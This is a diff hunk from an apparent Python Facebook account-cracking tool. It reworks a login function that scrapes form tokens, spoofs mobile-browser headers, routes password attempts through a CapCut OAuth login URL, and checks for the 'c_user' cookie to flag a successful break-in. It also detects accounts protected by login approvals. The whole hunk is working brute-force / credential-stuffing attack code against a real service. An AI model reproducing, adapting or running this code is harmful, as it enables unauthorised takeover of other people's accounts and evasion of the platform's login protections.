@@ -1260,49 +1260,38 @@ def mbasic(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'contact_point',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
-            'bi_xrwh': '0',
-            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAcNW7dnKAb_WUqhir8ZBk8LUcBFsiIuSHq2OKV8gUs2Ofl2jNxTnQw:0:0',
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw',
-            'csr': '',
-            'req': '2',
-            'fmt': '1',
-            'a': 'AYlZYUDiZqtfVxy_hd3jd217cyf2OexqVPFlTnUxynLWBo_wjxuJYFLWrUtycfiSD0Z65CyKW4F3k-tk1mj_6diK9rYLliY-s2Y5TR-47hJBog',
-            'user': '0'}
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'next': 'https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified',
+            'flow': 'login_no_pin',
+            'pass': pw,}
             headers =  {
-            'Host': 'm.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '1612',
-            'Origin': 'https://m.facebook.com',
-            'Viewport-Width': '360',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'X-Response-Format': 'JSONStream',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'X-Requested-With': 'XMLHttpRequest',
-            'X-ASBD-ID': '129477',
-            'DPR': '2',
-            'Accept': '*/*',
-            'Referer': 'https://m.facebook.com/',
-            'Accept-Language': 'en-US',}
+            'Host': 'm.prod.facebook.com',
+            'cache-control': 'max-age=0',
+            'upgrade-insecure-requests': '1',
+            'origin': 'https://m.prod.facebook.com',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .11; WOW64)PQ1A)Applewebkit/537.36 (KHTML, like Gecko) Chrome/106.0.4397.20 Safari/537.36 Vivaldi/6.0.2979.18',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'dpr': '2',
+            'viewport-width': '739',
+            'sec-ch-ua': '"Not)A;Brand";v="21", "Chromium";v="107"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"7.0.0"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="17.0.0.0", "Chromium";v="107.0.5812.132"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwocAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.prod.facebook.com/login/device-based/regular/login/?api_key=3213804762189845&auth_token=9b7a4c1cccc14f83a246bc14d774268b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&refsrc=deprecated&app_id=3213804762189845&cancel=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&lwv=100&locale2=id_ID&refid=9"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
